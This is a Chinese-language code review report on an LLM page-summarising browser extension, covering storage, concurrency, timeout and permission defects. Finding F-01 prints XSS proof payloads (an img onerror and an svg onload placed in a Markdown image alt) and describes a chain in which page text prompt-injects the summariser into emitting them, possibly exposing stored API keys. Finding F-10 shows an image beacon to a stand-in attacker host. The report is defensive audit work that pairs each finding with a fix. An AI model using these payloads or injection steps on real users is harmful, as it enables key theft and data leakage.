# KuaiKan v3.1.1 代码审查报告

- 审查对象：`main` @ `fbf4fa7`（v3.1.1，184 个跟踪文件，自研 TS/TSX/CSS 约 1.0 万行）
- 审查方式：五路并行深审（background/LLM 链、content/面板、设置页与存储、安全隐私、工程质量）+ 主审逐文件通读；**每条高严重度结论都由主审回到源码或产物独立复现后才采信**，验证与订正记录见第 8 节
- 全程只读，未修改任何源码；两处关键结论用 `node` 直接跑真实依赖复现（临时脚本写在 `.output/`，已删除）

---

## 0. 闸门与仓库状态（实测）

| 项目 | 命令 | 结果 |
|---|---|---|
| 类型检查 | `npm run compile`（tsgo --noEmit） | ✅ 通过 |
| Lint | `npm run lint`（eslint flat config） | ✅ 通过（零 warning） |
| 测试 | `npm run test`（Vitest） | ✅ 15 个文件 / 139 个用例全通过，2.83s |
| 版本三处同步 | package.json / package-lock 顶层 / `packages[""]` | ✅ 均为 `3.1.1`；CHANGELOG 首条为 `[3.1.1]`；tag `v3.1.1` 存在；`release/3.1.1` 内 zip 的 manifest 也是 3.1.1 |

**环境注意**：`npm run test` 在 DSH 的 `workspace-write` 沙箱内无法启动——Vite 加载配置时子进程管道 stdio 触发 `spawn EPERM`（沙箱禁用命名管道）。这条闸门必须提权一次才能跑通；`compile` 与 `lint` 不受影响。

---

## 1. 结论摘要

工程质量明显高于同类自用扩展：错误分类、时序插桩、正文提取双策略回退、引用短语模糊定位、迁移幂等设计、快照并发串行化都有明确设计意图和注释；lib 层主要纯逻辑基本都有测试。

但**上一版"未发现可利用高危漏洞"的结论是错的**——本轮用真实 `marked@18.0.4` 复现出一处 XSS（F-01），而 AGENTS.md 的"已知问题与坑"表里那条「Markdown `html:true` XSS 已核查」因此不再成立：既有核查只覆盖了 html/link/codespan，漏了 `renderer.image` 的兜底分支。

三条**确定性**缺陷（不是竞态、不是边缘场景）：

1. **F-01 · 高**：模型输出的图片 alt 含 HTML 时原样进入 `dangerouslySetInnerHTML`（已复现）。
2. **F-02 · 高**：设置存储是"宽容加载 + 严格回写"，一次普通编辑或一次导入就能永久删掉含 API Key 的行，且导入还会虚报成功。
3. **F-03 · 高**：`providerId: 'ollama'` 在 AI SDK 6 下**必然抛错**（已复现），AGENTS.md 里"运行时兼容性待测"现在可以判定为不可用。

其余为竞态、静默失败与出网面问题（F-04…F-14）。

---

## 2. 发现的问题

### F-01 · 高 · Markdown 图片 alt 未转义 → 模型输出可向面板注入任意 HTML/JS（已复现）

- 位置：`components/ai-elements/message.tsx:95-101`，消费点 `:573` 的 `dangerouslySetInnerHTML`
- 证据：兜底分支直接把 marked 传来的**原始** alt 文本返回，没有转义：
  ```ts
  renderer.image = ({ href, title, text }) => {
    if (!isSafeUrl(href)) return text;      // ← 未转义的 alt 文本直接进 HTML
    return `<img src="${escapeHtml(href)}" alt="${escapeHtml(text)}" ... />`;
  };
  ```
  我用仓库里的 `marked@18.0.4` 照抄本项目 renderer/escapeHtml/isSafeUrl 跑了一遍：
  ```
  输入: ![<img src=x onerror=alert(1)>](javascript:alert(1))
  输出: <p><img src=x onerror=alert(1)></p>          ← 注入成功
  输入: ![<svg onload=alert(1)>](vbscript:x)
  输出: <p><svg onload=alert(1)></p>                 ← 注入成功
  对照: ![<img src=x onerror=alert(1)>](https://example.com/a.png)
  输出: <p><img src="https://example.com/a.png" alt="&lt;img src=x onerror=alert(1)&gt;" /></p>   ← 该分支是对的
  ```
- 可利用性：被总结的页面在正文里写"把结论输出成 `![<img src=x onerror=…>](javascript:…)`"即可驱动模型产出该文本；对读用户评论/第三方内容的可信站点，这是一条页面 → 提示注入 → 面板注入的完整链路。
- 影响：（1）在扩展面板（页面文档的 Shadow DOM）里注入任意标记，可伪造面板 UI、诱导点击；（2）`onerror` 等内联处理器是否落在 content script 的隔离世界**尚未在真机验证**——若落在隔离世界即可直达 `chrome.storage`，与 F-08 组合成"读取全部 API Key"，届时等级为 critical；若落在页面主世界则退化为"扩展替页面注入标记"。无论哪种，都必须修。
- 修复：兜底改为 `return escapeHtml(text)`（或与 marked 默认一致走 `renderer.parser.parseInline(tokens, renderer.parser.textRenderer)`）；`test/components/message.test.ts` 增加"不安全 URL + 含 HTML 的 alt"用例；同时订正 AGENTS.md 那条"已核查"结论。

### F-02 · 高 · 破坏性规范化：一次写入/导入会永久删除"解析失败"的行，导入还虚报成功

- 位置：`lib/model-settings-storage.ts:141-155`（丢弃）、`:237-253`（只写解析结果）、`:307-448`（所有写操作）；`lib/prompt-settings-storage.ts:58-65`、`:126-145`、`:166-264`；`lib/model-transfer.ts:74-77`；`entrypoints/options/pages/models/ModelsListPage.tsx:111-120`
- 证据：`parseModels` 对形状不合法或 `providerId` 不在定义表里的行只 `logger.warn` 后 `continue`；而 `writeModelSettings` 写回的是**解析后的数组**，`updateModelConfig` / `deleteModelConfig` / `setModelConfigModelId` / `moveModelConfig` / `setDefaultModelConfig` 无一例外。Prompt 侧结构完全相同。
  导入链路宽进严出：`parseModelExportFile` 只要求 `row.id` 与 `row.modelId` 是 string，行随后在 `replaceModelSettings → writeModelSettings` 里被严格校验丢弃，而 UI 用**未再校验**的 `merged.length` 报数：
  ```
  await replaceModelSettings({ models: merged, defaultModelId });
  toast.success(`已导入 ${merged.length} 个模型配置`);
  ```
- 触发场景：① 装过更新版本后回退、或手工编辑过 `model-configs`，用户随便改一下别的模型 → 那行连同 API Key 被永久删除且无提示；② 导入含未知 `providerId` 的文件 → 存储被"替换"成过滤后的结果，最坏情况列表被清空，toast 仍显示"已导入 N 个"。
- 修复：加载与写回分离——未通过校验的原始行原样保留（或搬进 `local:model-configs-quarantine`）；`writeModelSettings` 返回 `{ saved, dropped }`，`dropped > 0` 时 UI 警告，`saved === 0` 时中止导入；`parseModelExportFile` 复用存储层同一套校验，让"能导入"与"能落盘"一致。

### F-03 · 高 · `ollama` provider 在运行时必然失败（已复现），且错误落到 `unknown` 显示英文原文

- 位置：`lib/model-provider.ts:50-51`；`entrypoints/background/ai-sdk-connect-bridge.ts:135-139`
- 证据：`createOllama(settings).languageModel(id) as unknown as LanguageModel` 绕过了类型检查，但绕不过运行时检查。我在仓库目录直接跑真实依赖：
  ```
  specificationVersion = v1
  THREW: AI_UnsupportedModelVersionError | Unsupported model version v1 for provider "ollama.chat"
         and model "llama3". AI SDK 5 only supports models that implement specification version "v2".
  ```
  `ollama-ai-provider@1.2.0` 写死 `v1`，而 AI SDK 6 的 `streamText` 在构造时同步解析模型并拒绝非 v2/v3。
- 影响：任何 `providerId: 'ollama'` 的配置每次总结都立刻失败；错误无 status、无 timeout/cors 关键词，`classifySummaryError` 落到 `unknown`（`lib/error-taxonomy.ts:66`），用户看到的是上面那段英文原文，面板不会给出可操作提示。AGENTS.md 的"运行时兼容性待测"可以结案为**不可用**。
- 修复：删掉 ollama 分支，改用 OpenAI 兼容端点（`createOpenAICompatible({ baseURL: 'http://localhost:11434/v1', name: 'ollama', apiKey: 'ollama' })`，`<all_urls>` 已覆盖 localhost）；或换实现 v2/v3 规范的 provider 包，而不是强转。

### F-04 · 中 · 模型/Prompt 的读-改-写没有并发保护（同一仓库里快照链路却做了串行化）

- 位置：`lib/model-settings-storage.ts:307-448`、`lib/prompt-settings-storage.ts:166-264`；对照 `entrypoints/background/panel-snapshot-bg.ts:21-26`
- 证据：所有变更都是"读全量 → 改内存 → 写全量"，连只改一个字段的 `setModelConfigModelId`（`:426-448`）和只改默认项的 `setDefaultModelConfig`（`:402-415`）也是整表写回。同一把键的写入者有 popup（`entrypoints/popup/App.tsx:82`、`:94`）、内容面板（`entrypoints/content/summary/useContentApp.ts:449`）、设置页（`GeneralPage.tsx:334`、`ModelsListPage.tsx:303`）。播种做了单飞（`lib/prompt-settings-storage.ts:301-316`）、快照做了串行队列，唯独 CRUD 没有任何保护。
  另：`lib/general-settings-storage.ts:41-53` 实现了"按 baseline 差量写入"以防跨上下文互相覆盖，但唯一调用方 `GeneralPage.tsx:232` 没传 baseline，该保护**当前完全未生效**。
- 触发场景：面板切换 modelId 期间设置页保存了另一个模型的编辑，后写者用旧数组覆盖；若期间发生删除，被删的模型会"复活"。
- 修复：模型/Prompt 的写操作统一收口到 background，复用 `serialize` 形态；baseline 要么用上，要么删掉以免误导。

### F-05 · 中 · 迁移先 `remove` 后 `set`：两步之间失败会永久丢失被"救援"的键

- 位置：`lib/migration.ts:206-213`、`:244-250`
- 证据：先 `browser.storage.local.remove(keysToRemove)`，再把（含版本标记的）`keysToSet` 写回。`wxt.config.ts` 未申请 `unlimitedStorage`，`storage.local` 受 10MB 配额约束；`set` 抛错只被 `catch` 成 `{ok:false}`，而 `remove` 已经生效、版本标记没写成功意味着下次还会重跑迁移，但源键已经不在。
- 影响：`model-configs`（用户唯一的模型配置）正是被救援的典型对象，MV3 worker 被杀或配额失败即不可恢复。
- 修复：先 `set`（含版本标记）成功后再 `remove`；或逐个键 `set` 成功后再删对应源键。

### F-06 · 中 · 整条 LLM 链没有任何超时，provider 挂起时面板无限转圈

- 位置：`entrypoints/background/ai-sdk-connect-bridge.ts:135-155`
- 证据：`streamText({ abortSignal, messages, allowSystemInMessages, model, system, onError })` 没有 `timeout`；AI SDK 6 支持 `timeout: { totalMs, stepMs, chunkMs }`。全仓搜 `timeout` 只有分类器文案与状态码匹配，没有任何调用方兜底。
- 影响：接受了连接但不再吐数据的上游（挂住的代理、被压满的本地 Ollama、静默丢包的网关）既不触发 `onError` 也不关 port，`status` 永远停在 `submitted/streaming`；分类器里准备好的 `timeout` 文案（`lib/error-taxonomy.ts:73`）没有任何代码路径能产出。
- 修复：加 `timeout: { totalMs: 120_000, chunkMs: 60_000 }`；超时错误经 `onError → postErrorFrame` 后报文自带 "timed out"，分类器会自动命中 `timeout`，无需改分类器。阈值需按实际 provider 定。

### F-07 · 中 · 空输出的"防空跑"判断是不可达代码，空总结被当成成功落盘

- 位置：`entrypoints/background/ai-sdk-connect-bridge.ts:159`、`:217-227`
- 证据：`chunkCount` 统计的是 `result.toUIMessageStream()` 的**所有**帧，而 AI SDK 6 的 `sendStart` / `sendFinish` 默认都是 `true`（已在 `node_modules/ai/dist/index.js` 中确认 `sendStart = true, sendFinish = true` 与 `if (sendStart) {` / `if (sendFinish) {` 的无条件发射），所以一次成功调用必然至少产出 start/finish 帧，`chunkCount === 0` 永不成立，`postMessage({type:'done'})` 总会执行。
- 影响：模型返回空内容时前端收到正常的 `done`，`finish` 帧带来的 metadata 会压入一条**没有任何 part 的 assistant 消息**；于是 `ContentAppFrame.tsx:186` 的 `hasSummary` 变 true → 面板进入"已总结"态、隐藏总结入口，正文区空白；这条空消息还会被写进快照（`lib/panel-snapshot.ts:54-56` 只按 `role === 'assistant'` 过滤），刷新后依旧"已总结但没内容"。
- 修复：把判断从"有没有帧"改成"有没有内容帧"——单独累计 `text-delta`/`reasoning-delta`，为 0 时改为 `postErrorFrame` 且不发 `done`。

### F-08 · 中 · API Key 被读进 content script（页面上下文），且现在有了 F-01 这条注入路径

- 位置：`entrypoints/content/summary/useContentApp.ts:266-275`；`lib/model-settings-storage.ts:112-132`
- 证据：content script 的隔离世界直读 `browser.storage.local`（构建产物 `content-scripts/content.js` 中同时含字面量 `model-configs` 与 `apiKey`，实测分别出现 1 次 / 2 次），整行配置（含明文 Key 与自定义 headers）常驻页面上下文的 React state；UI 实际只用 `id/name/providerId/modelId/modelIds/iconPath/priceUnit/inputTokenPrice/outputTokenPrice`。
- 影响：F-01 一旦落在隔离世界，注入的脚本可直接 `storage.local.get` 读走全部密钥；即使 F-01 修掉，这也是把"密钥永不进入页面上下文"从结构保证降级为"靠一处转义正确"。
- 修复：content 侧只取展示所需字段（做一次投影），`apiKey`/`headers` 的读取留在 background。

### F-09 · 中 · `pageMessagesRef` 保存未过滤的全量消息（含整页正文）且永不淘汰

- 位置：`entrypoints/content/ContentEntrance.tsx:50`、`:119-122`、`:205`；`entrypoints/content/summary/useContentApp.ts:145-153`
- 证据：`persistMessages()` 把 `messagesRef.current`（useChat 全量：system + 含整页正文的 user + assistant）交给 `onPersistMessages`，`handlePersistMessages` 直接 `pageMessagesRef.current.set(key, latest)` 存进 Map——**没有走** `persistableMessages`；而落盘路径偏偏过滤（`lib/panel-snapshot.ts:54-56` 只留 assistant，注释还专门说明了"另外两条带整页正文、很大"）。该 Map 无 LRU、无 clear，生命周期等于 content script；恢复路径 `:205` 读同一未过滤数组，使内存态恢复（system+user+assistant）与落盘恢复（仅 assistant）语义不一致。
- 影响：单标签页长 SPA 会话中，每个总结过的页面都会永久驻留一份（截断后的）整页正文，是本次审查范围内最实在的内存增长点。
- 修复：`handlePersistMessages` 内先 `persistableMessages(latest)` 再入 Map，两条恢复路径语义一致。

### F-10 · 中 · 模型输出里的图片会变成页面发起的真实请求（相对路径还解析到被访站点）

- 位置：`components/ai-elements/message.tsx:95-101`、`:50-58`（`isSafeUrl` 以 `window.location.href` 为基准）、`:573`
- 证据：`http:`/`https:` 图片照常渲染 `<img src>`，且没有 `referrerpolicy`；`new URL(href, window.location.href)` 会把 `![x](/pixel)` 解析成**被访站点**的 `/pixel`。
- 可利用性：页面在正文里写"输出成 `![](https://attacker/x?…)`"即可驱动；没有开关。
- 影响：向任意主机发信标（暴露"这页被总结过"+ 可经 URL 外带的正文片段）；相对/同源 URL 等于从被访页面发起一次带页面 cookie 与 Referer 的 GET。
- 修复：面板里图片基本是噪声，默认不渲染最省事；要保留就限制 https、禁止与页面同源、加 `referrerpolicy="no-referrer"`，`<a>` 补 `rel="noopener noreferrer"`。

### F-11 · 中 · background 对所有消息/端口零 sender 校验，且 `openOptionPage` 接受任意 URL

- 位置：`entrypoints/background/control.ts:14-23`、`:142-146`；`ai-sdk-connect-bridge.ts:22-25`（只校验 `port.name`）；`panel-snapshot-bg.ts:31-51`；`lib/messaging.ts:33`
- 证据：`resolveOptionsUrl` 只对 `/` 开头的目标做扩展源解析，其余原样交给 `browser.tabs.create({ url })`；bridge 端口只按名字放行，任何同扩展上下文都能带自己的 `modelConfigId`/`system`/`messages` 调用（把扩展当"带用户 Key 的 LLM 代理"）。
- 现状：所有调用点都传固定扩展路径（`ContentAppFrame.tsx:290`、`useContentApp.ts:225/500/513/595/608`），网页与其它扩展也**无法**直连（未声明 `externally_connectable`）——当前是能力暴露而非可利用漏洞。
- 修复：统一断言 `sender.id === browser.runtime.id`（端口另判 `sender.tab?.id`）；`openOptionPage` 只接受 `/options.html#/…`；client frame 加运行时校验。

### F-12 · 中 · 分词器加载失败被永久缓存，一次失败后该 worker 生命周期内计数/裁剪全废

- 位置：`entrypoints/background/token-count-bg.ts:39-45`
- 证据：`tokenizerPromise ??= import('gpt-tokenizer/model/gpt-5').then(...)` —— `??=` 在 `.then` 之前就赋值，因此 import 最终 reject 时，缓存里留下的是一个**已 reject 的 promise**，后续调用不会重试。`markTokenizerLoaded()` 也永不执行（timing 帧里长期缺"后台分词器加载完成"）。
- 影响：MV3 worker 在 `import()` 途中被回收、扩展资源瞬时读取失败等一次性错误，会让 `countInputTokens*` / `truncateByTokens*` / `splitTokensWithTiming` 在该 worker 实例内全部失败；由于调用方把截断失败降级为"原样发送"（`useContentApp.ts:543-548`），现象会隐蔽成"长文不再被裁剪、直接顶到 provider 报错"。
- 修复：失败时清空缓存——`import(...).then(ok, (e) => { tokenizerPromise = null; throw e; })`。

### F-13 · 中 · 面板不订阅 Prompt 变更：设置页改了/删了提示词，面板照旧用旧的

- 位置：`entrypoints/content/summary/useContentApp.ts:364-381`（只 watch 模型键）、`:266-283`、`:507-518`
- 证据：全仓 `storage.watch` 只有 4 处（右键菜单开关、模型配置、`useWxtStorage` 通用、日志级别），没有任何一处订阅 `PROMPT_CONFIG_STORAGE_KEY` / `DEFAULT_PROMPT_ID_STORAGE_KEY`（`git grep` 证实这两个键只在 `prompt-settings-storage.ts` 内部出现）。
- 影响：用户在设置页修好提示词格式后回到仍开着的面板点"总结"，发的还是旧模板；若当前提示词已被删除，`prompts.find(...)` 仍能在陈旧数组里命中，继续用一个已删除的提示词，与"没有可用的提示词"兜底提示自相矛盾。
- 修复：watch 扩到两个 Prompt 键并在回调里重载；`currentPromptId` 不在新列表时回落到 `defaultPromptId ?? prompts[0]?.id`。

### F-14 · 中 · dom-heuristic 抽不到正文时返回"空内容对象"，被当成有效正文缓存并发出空 prompt

- 位置：`lib/page-extraction.ts:372-394`、`:396-411`；`entrypoints/content/summary/useContentApp.ts:310-333`、`:524-528`
- 证据：`domHeuristicParseRead` 在无 body 或 `bestText || bodyText` 为空时仍返回 `toWebpageContent(doc, '', 'dom-heuristic')`（`textContent === ''` 但对象为真）；`parsePageContent` 在兜底也无正文时 `return primaryResult`，即返回这个空对象（readability 路径无正文时返回的是 `undefined`）。调用侧 `if (extracted) {...}` 判真即过，`if (!fresh) return current` 也拦不住，`!pageContent` 守卫永不触发。
- 影响：只在 `pageTextExtractMethod = dom-heuristic` 时命中：面板显示"有内容"、token 数 0，用空 `{{textContent}}` 调模型（幻觉或报错），空结果还会写进正文缓存。
- 修复：`domHeuristicParseRead` 文本为空时返回 `undefined`（与 readability 对齐），或 `parsePageContent` 统一收口为"无文本即 undefined"，调用侧改判 `extracted?.textContent`。

---

## 3. 其他观察

### 3.1 静默失败与交互细节

| 位置 | 问题 | 建议 |
|---|---|---|
| `GeneralPage.tsx:333-336`、`popup/App.tsx:80-83` | 默认模型/提示词下拉忽略 `setDefaultModelConfig` 的布尔返回、无 try/catch；失败时下拉悄悄弹回，控制台多一条未处理 rejection。i18n 里现成的 `defaultModelFailed`/`defaultPromptFailed`（`lib/i18n.ts:99,101`）全仓无引用 | 检查返回值 + catch + toast |
| `GeneralPage.tsx:203-220` | 保存失败时 `setSettings(previous)` 回滚**整个对象**，会把同时刻已成功保存的其它开关一起改回旧值；用户再点一次就把旧值真正写回存储 | 只回滚该键，或失败后以存储为准重载 |
| `useContentApp.ts:579-639` | 外部触发（右键菜单/popup）在无正文时 `return` 而不清 `autoSummarizePending`、不提示；手动路径有 toast（`:524-528`）。残留标志可能被"迟到"的正文再次触发，对刚启动的流 stop 后重启 | 补 `pageContent === null` 分支的提示与清标志 |
| `useContentApp.ts:471-480` | 重启总结用"停止 + 轮询 2 秒"，超时后静默返回，外部触发看起来像没反应 | 等待流结算 Promise 或提示失败 |
| `ModelEditor.tsx:198-210`、`PromptEditor.tsx:26-33`、`OptionsLayout.tsx:67` | 两个编辑器都没有未保存离开保护（返回按钮直接 `navigate(-1)`），而 `common.unsavedChanges`/`common.allChangesSaved`（`lib/i18n.ts:7,16`）是死键——说明曾经有过 dirty 跟踪 | 加 `isDirty` + `useBlocker`，或 blur 自动保存 |
| `ModelEditor.tsx:684-711` | 数值输入把 `value <= 0` 显示为 `''`，`''`/非法字符又解析成 0 → 想输 `0.000001` 时先敲的 `0` 会被清空；"价格为 0"与"未填"不可区分 | 存字符串原文，提交时再 `Number()` |
| `ModelEditor.tsx:57-69` + `model-settings-storage.ts:33-43` | headers 的 JSON 只校验"顶层是对象"，非字符串值被 `cleanHeaders` 静默丢弃（保存成功但 header 消失）；`cleanExtraBody` 完全不校验 | headers 逐值校验为 string 并即时报错 |

### 3.2 background 错误路径与裁剪边界

- `ai-sdk-connect-bridge.ts:277-311`：`getErrorMessage` 的注释写着"HTML bodies are intentionally skipped"，实现却在 JSON 解析失败后原样返回截断的正文。后果是 Cloudflare/nginx 的 5xx HTML 会被显示在面板错误提示里；这也是 provider 响应字节离开 background 的唯一通道（`APICallError` 不含请求头，不是现成的密钥泄漏，但自定义 baseURL 带 `?key=` 时会把它包进来）。建议按注释意图收口。
- `token-count-bg.ts:101,114-138`：两个 truncate RPC 入口不校验 `maxTokens` 类型与范围。负数会让 `front` 策略变成 `slice(0, -3)`（实测保留除尾部 3 个 token 外的全部内容，而不是空串），`0` 则重载为"不裁剪"；`getEffectiveInputTokenLimit` 的 `Math.floor(maxInputTokens * 0.9)` 在小数值下会算成 0，用户配了上限却完全不裁剪。当前调用点都有 `> 0` 守卫，属潜伏问题。
- `lib/error-taxonomy.ts:40`：**任何** 404 都判成 `model-not-found`（提示"请检查模型 ID"），而 baseURL 路径配错时返回的正是 404；`:51-57` 的 `permission` 关键词嗅探过宽，provider 正文里出现 "permission" 就会提示"请检查扩展站点访问权限"，指向错误的排查方向。
- `ai-sdk-connect-bridge.ts:149,175,188,234`：`logger.error` 会把整个 `APICallError` 打出来，其中 `requestBodyValues` 是含整页正文的 prompt、`responseBody` 是完整响应体（不含 Key）。error 级别下必然输出，建议只打 `name/statusCode/message`。
- `popup/App.tsx:112`：`logger.info('[popup] extract result', result)` 把**整页正文**打进 console，而 popup 不受 content 的 info→warn 降级规则保护（`lib/logger.ts:51-53`）。建议只打长度。

### 3.3 权限与 manifest 最小化（`wxt.config.ts:16-27`）

| 项 | 判定 | 依据 |
|---|---|---|
| `host_permissions: ['<all_urls>']` | 必需 | content script 需注入任意页面；API base URL 由用户任配 |
| `activeTab` | 很可能可删 | 全仓无代码依赖其手势授权语义（`git grep activeTab` 只命中 popup 里的局部变量名）；`<all_urls>` 下冗余。删权限属运行时行为变更，建议真机验证后再改 |
| `scripting` | 可收紧 | 仅 `control.ts:57-62` 探测 shadow root 是否就绪，`ping` 已能提供同等信息 |
| `web_accessible_resources` | 可显著收紧 | `['icon/*','llm-icons/*','*.svg','*.png']` 过宽；`public/wxt.svg` 在源码中**零引用**却被打包，并因 `*.svg` 通配可被任意页面作为文档加载（SVG 内脚本以扩展源执行）。已核查当前所有 SVG 无 `<script>`/`on*=`，属潜在风险。建议收敛为 `['icon/*','llm-icons/*']` 并删除 `public/wxt.svg` |
| 自定义 WAR 缺 `use_dynamic_url` | 加固 | WXT 追加的 `content-scripts/content.css` 条目带该字段，自定义条目没有 → 扩展 ID 对全网站稳定可见 |

DNR 规则（`entrypoints/background/cors-fix.ts:120-169`）：文件头把"删 Origin 无效、必须注入响应头"讲清楚了，做法有据。但 `urlFilter: '*'` 让扩展对**所有**出网请求都不再有 CORS 兜底。复核结论：`initiatorDomains` 匹配请求发起者而非 URL，网页请求不会被这条规则覆盖，**未发现第三方页面的滥用路径**；风险在于（a）将来任何"用页面可控 URL 发 fetch"的改动会立刻变成可读任意跨域响应，（b）用户把站点访问收窄为"点击时/指定站点"后该规则仍让扩展出网，（c）`Access-Control-Allow-Headers: '*'` 与允许 DELETE/PATCH/PUT 是不必要的放大。建议按实际配置的 baseURL host 生成规则。

### 3.4 依赖与工程配置

- **`picomatch` 完全未被引用**：`git grep picomatch` 只命中 lock 文件与 CHANGELOG 里"已移除站点定制"的历史记录——是那个功能的遗留直接依赖，可删。
- **`zod` 无任何源码引用**（`git grep "zod" -- '*.ts' '*.tsx'` 零命中），只是 `ollama-ai-provider` / `ai` 的 peer；而 AGENTS.md 技术栈表仍列"验证 | Zod"。
- **`typescript` 是幽灵依赖**：devDependencies 里没有它（只有 `@typescript/native-preview`），`npm ls typescript` 显示 `6.0.3` 仅由 `typescript-eslint@8.70.0` 传递带入，而 `eslint.config.js:18` 的 parser 运行时需要它；lint 用 TS 6.0.3、类型检查用 TS 7.0.0-dev。
- `wxt.config.ts:36` 的 `visualizer({ filename: 'stats.html' })` 无条件挂在 vite 插件上 → 每次 build/zip 都在仓库根重写 936KB 的 `stats.html`（现存那份是 3.0.1 构建的产物）。建议按环境变量开启或输出到 `.output/`。
- `eslint.config.js:13` 的 ignores 未覆盖 `next/**`、`release/**`；两条规则都是 `warn`（所以 `npm run lint` 恒 exit 0）；仓库无任何 CI（`git ls-files .github` 为空）。当前 lint 零 warning，提为 `error` 的即时成本几乎为零；规则面也偏窄——这个 codebase 大量 async RPC/port 通信，`@typescript-eslint/no-floating-promises` 会很有价值。
- `vitest.config.ts:13` 是 `include: ['test/**/*.test.ts']`，而 `tsconfig.json` 同时收 `test/**/*.ts(x)` → 将来新增 `*.test.tsx` 会被**静默跳过**（不跑也不报错，类型检查却会过）；`environment: 'node'` 也意味着组件测试目前写不了，需一并决定是否引入 jsdom/happy-dom。另无 coverage 配置。

### 3.5 仓库与发布产物

- **`.output/chrome-mv3/manifest.json` 仍是 `3.0.1`**（构建时间 2026-09-21），而仓库已是 3.1.1；`.output/` 下还留着 `kuai-kan-3.0.1-chrome.zip`（1.63MB）和 2.3.0 时代的 `head-commit.txt`。AGENTS.md 把 `.output/chrome-mv3/` 定义为"Chrome 加载已解压扩展"的产物，照它手动加载会跑到两个版本前的代码。
- `release/3.1.1/kuai-kan-3.1.1-chrome.zip` 里 `background.js` 是 **2,708,596 字节**；文本中可见 `cl100k_base`/`o200k_base` 词表标记，`chunks/` 下**没有**独立 tokenizer chunk——与 AGENTS.md 描述的"background 动态导入"不符（源码 `token-count-bg.ts:40` 确实写的是动态导入，`wxt.config.ts` 也没有相关分块设置）。MV3 SW 每次冷启动都要解析这 2.6MB。修法需在真机构建后确认。
- `next/` 是 **295.6MB 的孤儿构建目录**（顶层只有 `.output`/`.wxt`/`node_modules`，无源码、无 `package.json`），对应已删除的 v4 侧栏线；它不被 `.gitignore` 覆盖（只是内部目录名恰好命中通用模式），eslint ignores 也没排除它。
- `release/` 有 9 个 zip 被跟踪（约 19MB，`.git` 已 17MB）；`release/3.1.1/kuai-kan-3.1.1-chrome/`（解压校验产物）未跟踪，所以工作区实际是脏的（`git status --untracked-files=all` 可见）。zip 既然已附在 GitHub Release 上，"只留 zip"能省掉一半体积。
- `.freebuff/project-id` 被跟踪，属工具元数据，建议进 `.gitignore`。

### 3.6 其他小瑕疵

- `components/ai-elements/message.tsx:567-577`：`{...props}` 排在 `dangerouslySetInnerHTML` 之后，运行时可覆盖转义结果（当前唯一调用点不传该属性，不可利用，但和 F-01 同属"渲染管线靠约定"的问题，建议前置展开）。
- `components/ai-elements/message.tsx:121-152`：`⟦cite:…⟧` 占位符若落在链接/图片的 URL 或 title 里，替换用的 `<span class="kuai-cite" …>` 标记会插进属性值内部，撑坏 DOM（实测：`[click](⟦cite:evil⟧)` 会生成 `<a href="<span …>">`）。短语本身经 `escapeHtml`，**未构造出可执行脚本**。建议替换只在文本节点做（`DOMParser` 后遍历 Text 节点再序列化）。
- `entrypoints/content/scope.tsx:22-24`：页面只要预先创建 `<webpage-summary-entrance>`，面板就永不挂载；宿主在页面 DOM 中也可被页面 CSS 压制或仿冒。另：宿主被页面清空/重建后不会重新挂载（未用 WXT 的 `ui.autoMount`），面板会静默消失到刷新为止；`ping`/`extractText` 两个 runtime 监听也未绑定 `ctx.onInvalidated` 解绑（WXT 只自动清理自己的 UI）。
- `PanelContainer.tsx:64-94`：`isHeaderReachable` 只在快照加载时校验一次，没有 `window.resize` 监听 → 大窗口把面板放低后缩小窗口，标题栏不可达且不自动回落。`RightFloatingBallContainer.tsx:88,124,146-180`：拖拽时给**宿主页面** body 加 `select-none`（`cssInjectionMode: 'ui'` 下该 class 对页面无效，反而是 Tailwind 站点会整页不可选中），且监听只在 `mouseup/touchend` 解除、无 `touchcancel`/`pointercancel`、无 unmount 清理 → 窗口外松开会让球卡在拖拽态、class 永不摘除。建议改 Pointer Events + `setPointerCapture`，清理放进 effect。
- `entrypoints/background/cors-fix.ts:76`：`import { browser,  } from 'wxt/browser';` 多一个逗号与空格（现有 lint 规则不查 import 格式）。
- `lib/page-content-cache.ts:6-10`：`CacheEntry.href` 从未被读取，与 Map key 重复。
- `lib/prompt-settings-storage.ts:294`：`settings.prompts[0] ?? await ensureSamplePrompt()` —— `ensureSamplePrompt` 内部再 `loadPromptSettings()` 并调 `createPrompt()`（又读一次），单次播种最多读三遍存储。

---

## 4. 复核为"设计正确、不要改"的部分

| 位置 | 结论 |
|---|---|
| `message.tsx:84-89`、`:145-152`、`:573` 兜底 | 除 F-01 那条分支外，转义管线有效：`renderer.html` 对块级/行内 HTML token 都转义（实测 `&lt;img…&gt;`）；link 的 href 先过 `isSafeUrl` 再 `escapeHtml`；`escapeHtml` 转义 `&` 使 `&#106;avascript:` 实体绕过失效；citation chip 的短语与属性均转义；空 html 兜底 `escapeHtml(children)`；`ReasoningBlock` 用 React 文本节点；`pageContent.content`（Readability 产出的 HTML）全仓无渲染点 |
| `lib/model-provider.ts:88-116` | `extraBody` 只在 JSON 字符串 body 上合并，其余原样透传；`...init` 保留 `signal`/`method`/`headers`，不破坏流式请求 |
| `entrypoints/background/panel-snapshot-bg.ts:21-26`、`lib/panel-snapshot.ts:62-89` | 快照读-改-写串行化（FIFO）、按 pageKey 合并且不改入参、只落 assistant；`openedExplicitlyRef` 的 OR 语义经推演不会被过期 load 反转 |
| `lib/page-content-cache.ts:38-82` | 每次命中都用实时 `innerText` 的 length + 头尾 512 字符签名复核，SPA 换页不串正文；LRU 上限 20 且重插入移到队尾 |
| `lib/scroll-to-text.ts` | 无 `window.find` 兜底是有意设计；索引缓存由 MutationObserver 失效并 disconnect，命中 detached 节点重建一次；扫描受 fragment 长度/比例与候选上限约束；高亮走 CSS Custom Highlight API，不碰页面 selection |
| `lib/migration.ts:154-168` | WXT 的 `area:key` 前缀会被剥掉、raw key 才是活键，这段历史坑已注释锁定，版本 3 幂等 |
| `hooks/useWxtStorage.ts:42-69` | 用 `watchedDuringInitialLoad` 防初始快照覆盖并发 watch 到的新值 |
| `lib/model-transfer.ts:111-123` | 导入的密钥回填被 `providerId + 归一化 baseURL` 双重钉死，不会把本地 Key 交给别的 endpoint |
| `entrypoints/content/scope.tsx:64-78` | popup"复制页面"确实遵守 `pageTextExtractMethod` |
| transport 终止路径 | `done`/`error`/`abort`/`onDisconnect` 四条路径都有 `closed` 守卫并走 `closePort()`；端口断开被转成明确错误而非静默截断；错误分类帧顺序上"带 status 的那帧先到"，`errorText` 那帧被守卫丢掉 |
